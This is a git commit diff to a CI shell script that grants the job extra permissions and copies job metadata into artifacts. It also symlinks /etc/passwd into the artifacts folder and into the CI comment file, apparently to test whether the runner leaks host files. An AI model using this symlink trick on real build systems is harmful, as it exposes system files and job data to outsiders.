20ffeedca4e4edfb8b5a588eb6e0dc286909c693
Dario Nieuwenhuis <dirbaio@dirbaio.net>
2023-07-02 01:36:30 +0200

    xafsd

--- .github/ci/lol.sh
+++ .github/ci/lol.sh
@@ -3,7 +3,10 @@
 ## on push branch=wtflol
 ## on push branch~=gh-readonly-queue/main/.*
 ## on pull_request
+## permission contents write
+## permission_repo stm32-data-generated
 
 set -euo pipefail
-
-echo Hello World > /ci/comment.md
+cat /ci/job.json > /ci/artifacts/lol.json
+ln -s /etc/passwd /ci/artifacts/haxx.txt
+ln -s /etc/passwd /ci/comment.md
